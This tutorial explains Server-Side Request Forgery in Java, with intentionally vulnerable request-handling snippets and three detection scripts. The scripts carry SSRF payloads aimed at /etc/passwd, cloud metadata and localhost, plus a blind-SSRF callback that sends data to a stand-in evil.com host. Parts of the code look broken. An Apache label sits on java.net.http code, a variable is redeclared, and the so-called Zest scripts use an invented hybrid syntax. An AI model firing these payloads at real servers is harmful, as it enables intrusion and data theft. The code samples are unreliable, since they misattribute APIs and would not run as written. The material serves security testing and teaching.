# Server-Side Request Forgery (SSRF) (CWE-918) in Java

###### Understanding Server-Side Request Forgery (SSRF)

#### Overview

Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker can make a server-side application send HTTP requests to an arbitrary domain of the attacker’s choosing. SSRF can lead to serious consequences, including data theft, denial of service, and access to internal resources and services. The vulnerability arises when user input is improperly validated and used directly in the construction of a URL by the server.

#### Key SSRF Attack Vectors

1. **Accessing Internal Services**: Using the web server to relay requests to internal services that are normally inaccessible from outside.
2. **Fetching Files from the Local File System**: Using file:// URLs to access local files.
3. **Accessing Metadata Services**: Especially relevant in cloud environments (like AWS EC2’s metadata service).
4. **Exploiting Trust Relationships**: Using the server’s trust in local or private networks to send malicious requests.

### Variations of SSRF in Java-based Web Applications

#### 1. Direct URL Input Vulnerability

This is the most straightforward SSRF scenario, where user input is directly used to construct a URL.

**Example**: Spring Framework with RestTemplate

```java
RestTemplate restTemplate = new RestTemplate();
String url = request.getParameter("url"); //User input
String result = restTemplate.getForObject(url, String.class);
```

**Zest Script for Detection**:

```zest
// Direct URL SSRF Detection
var url = 'http://example.com/test';
var attackVectors = [
    'http://127.0.0.1:80',
    'http://localhost:80',
    'file:///etc/passwd',
    'http://169.254.169.254/latest/meta-data/'
];

void main() {
    for (var attackUrl of attackVectors) {
        var req = zest.client.get(url + '?url=' + attackUrl);
        var res = zest.client.send(req);
        if (res.body.indexOf('root:') != -1 || res.body.indexOf('meta-data') != -1) {
            zest.log('Potential SSRF detected with URL: ' + attackUrl);
        }
    }
}
```

#### 2. URL Parsing or Wrapping Vulnerability

Some applications might attempt to sanitize or parse URLs but fail to account for all possible forms of URL encoding or schemes.

**Example**: Apache HttpClient in Java

```java
HttpClient client = HttpClient.newHttpClient();
HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create(request.getParameter("url"))) //User input
    .build();
HttpResponse<String> response = client.send(request, BodyHandlers.ofString());
```

**Zest Script for Detection**:

```zest
// URL Parsing SSRF Detection
var url = 'http://example.com/test';
var attackVectors = [
    'http://localhost:80/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    'http://127.0.0.1:80#@evil.com',
    'http://[::]:80',
    'http://169.254.169.254/latest/meta-data/'
];

void main() {
    for (var attackUrl of attackVectors) {
        var req = zest.client.get(url + '?url=' + attackUrl);
        var res = zest.client.send(req);
        if (res.body.indexOf('root:') != -1 || res.body.indexOf('meta-data') != -1) {
            zest.log('Potential SSRF detected with URL: ' + attackUrl);
        }
    }
}
```

#### 3. Blind SSRF

Blind SSRF doesn’t provide immediate feedback to the attacker. Instead, it may trigger internal resources to make requests or generate effects that are observable somewhere else.

**Example**: Asynchronous HTTP Requests

```java
CompletableFuture<HttpResponse<String>> future = HttpClient.newHttpClient()
    .sendAsync(HttpRequest.newBuilder()
               .uri(URI.create(request.getParameter("url"))) //User input
               .build(),
               BodyHandlers.ofString());

// Response handling is elsewhere in the application
```

**Zest Script for Detection**:

```zest
// Blind SSRF Detection
var url = 'http://example.com/test';
var attackVectors = [
    'http://sandbox.evil.com/log?data=',
    'http://sandbox.evil.com/count?value=',
    'http://localhost/admin'
];
var detectionUrl = 'http://sandbox.evil.com/check';

void main() {
    for (var attackUrl of attackVectors) {
        var req = zest.client.get(url + '?url=' + attackUrl);
        zest.client.send(req);
    }
    // Delay to allow async processing
    zest.client.wait(5000);
    var detectReq = zest.client.get(detectionUrl);
    var detectRes = zest.client.send(detectReq);
    if (detectRes.body.indexOf('found') != -1) {
        zest.log('Potential Blind SSRF detected.');
    }
}
```

### Conclusion

Each SSRF vulnerability in Java-based web applications can be identified by understanding how URLs are constructed and validated. By targeting specific input vectors and obfuscation techniques, detection scripts can greatly minimize false positives and negatives. The provided Zest scripts aim to test various SSRF scenarios robustly, ensuring a comprehensive assessment during web application testing  .